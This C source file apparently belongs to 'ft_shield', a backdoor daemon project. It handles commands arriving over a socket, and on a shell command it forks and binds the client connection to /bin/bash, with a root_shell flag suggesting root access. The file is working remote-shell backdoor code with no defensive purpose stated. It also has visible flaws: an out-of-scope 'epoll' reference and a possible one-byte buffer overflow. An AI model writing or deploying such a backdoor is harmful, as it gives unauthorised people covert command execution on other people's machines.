#include "ft_shield.h"

bool root_shell = false;

static void handle_input(char *buffer, int userfd) {
	remove_nl(buffer);

	if (strcmp(buffer, CMD_HELP) == 0) {
		write(userfd, HELP_MSG, strlen(HELP_MSG));
	} else if (strcmp(buffer, CMD_SHELL) == 0) {
		root_shell = true;
		write(userfd, SHELL_MSG, strlen(SHELL_MSG));
		disconnect_user(userfd, epoll);
	}
}

void shell(int userfd) {
	pid_t pid = fork();
	if (pid == 0) {
		dup2(userfd, STDIN_FILENO);
		dup2(userfd, STDOUT_FILENO);
		dup2(userfd, STDERR_FILENO);
		execl("/bin/bash", "bash", NULL);
	}
	root_shell = false;
	waitpid(pid, NULL, 0);
	return ;
}

void read_input(int userfd, EPOLL_STRUCT epoll) {
	char buffer[BUFFER_SIZE];
	int len = read(userfd, buffer, sizeof(buffer));
	if (len == 0) {
		disconnect_user(userfd, epoll);
		return ;
	} else if (len < 0) {
		return ;
	}

	buffer[len] = '\0';
	log_event(buffer, LOG_INPUT);
	handle_input(buffer, userfd);
}